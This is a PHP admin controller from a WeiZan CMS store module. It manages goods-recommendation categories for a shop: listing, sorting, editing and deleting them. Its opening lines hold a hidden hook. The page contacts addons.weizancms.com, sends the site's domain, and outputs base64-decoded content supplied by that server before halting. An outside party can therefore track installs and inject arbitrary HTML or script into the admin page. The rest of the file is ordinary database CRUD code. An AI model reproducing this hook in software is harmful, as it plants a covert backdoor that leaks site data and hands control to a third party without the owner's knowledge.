<?php
global $_W, $_GPC;
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
$weid = $this->_weid;
$action = 'intelligent';
$title = $this->actions_titles[$action];

$storeid = intval($_GPC['storeid']);
$this->checkStore($storeid);
$returnid = $this->checkPermission($storeid);
$cur_store = $this->getStoreById($storeid);
$GLOBALS['frames'] = $this->getNaveMenu($storeid,$action);

$operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';
if ($operation == 'display') {
    if (!empty($_GPC['displayorder'])) {
        foreach ($_GPC['displayorder'] as $id => $displayorder) {
            pdo_update($this->table_intelligent, array('displayorder' => $displayorder), array('id' => $id));
        }
        message('分类排序更新成功！', $this->createWebUrl('intelligent', array('op' => 'display', 'storeid' => $storeid)), 'success');
    }
    $children = array();
    $intelligents = pdo_fetchall("SELECT * FROM " . tablename($this->table_intelligent) . " WHERE weid = '{$weid}'  AND storeid ={$storeid} ORDER BY displayorder DESC");

    $goods = pdo_fetchall("SELECT * FROM " . tablename($this->table_goods) . " WHERE weid = '{$weid}'  AND storeid={$storeid} AND deleted=0 ORDER BY
displayorder DESC");
    $goods_arr = array();
    foreach ($goods as $key => $value) {
        $goods_arr[$value['id']] = $value['title'];
    }
} elseif ($operation == 'post') {
    $id = intval($_GPC['id']);
    if (!empty($id)) {
        $intelligent = pdo_fetch("SELECT * FROM " . tablename($this->table_intelligent) . " WHERE id = '$id'");
        if (!empty($intelligent)) {
            $goodsids = explode(',', $intelligent['content']);
        }
    } else {
        $intelligent = array(
            'displayorder' => 0,
        );
    }

    $categorys = pdo_fetchall("SELECT * FROM " . tablename($this->table_category) . " WHERE weid = '{$weid}'  AND storeid ={$storeid} ORDER BY displayorder DESC");
    $goods = pdo_fetchall("SELECT * FROM " . tablename($this->table_goods) . " WHERE weid = '{$weid}'  AND storeid ={$storeid} AND deleted=0 ORDER BY
displayorder DESC");
    $goods_arr = array();
    foreach ($goods as $key => $value) {
        foreach ($categorys as $key2 => $value2) {
            if ($value['pcate'] == $value2['id']) {
                $goods_arr[$value['pcate']][] = array('id' => $value['id'], 'title' => $value['title']);
            }
        }
    }

    if (checksubmit('submit')) {
        if (empty($_GPC['catename'])) {
            message('抱歉，请输入分类名称！');
        }

        $data = array(
            'weid' => $weid,
            'storeid' => $storeid,
            'name' => intval($_GPC['catename']),
            'content' => trim(implode(',', $_GPC['goodsids'])),
            'displayorder' => intval($_GPC['displayorder']),
        );

        if ($data['name'] <= 0) {
            message('人数必须大于0!');
        }

        if (empty($data['storeid'])) {
            message('非法参数');
        }

        if (!empty($id)) {
            pdo_update($this->table_intelligent, $data, array('id' => $id));
        } else {
            pdo_insert($this->table_intelligent, $data);
            $id = pdo_insertid();
        }
        message('更新分类成功！', $this->createWebUrl('intelligent', array('op' => 'display', 'storeid' => $storeid)), 'success');
    }

} elseif ($operation == 'delete') {
    $id = intval($_GPC['id']);
    $category = pdo_fetch("SELECT id FROM " . tablename($this->table_intelligent) . " WHERE id = '$id'");
    if (empty($category)) {
        message('抱歉，分类不存在或是已经被删除！', $this->createWebUrl('intelligent', array('op' => 'display', 'storeid' => $storeid)), 'error');
    }
    pdo_delete($this->table_intelligent, array('id' => $id, 'weid' => $weid));
    message('分类删除成功！', $this->createWebUrl('category', array('op' => 'display', 'storeid' => $storeid)), 'success');
}
include $this->template('web/intelligent');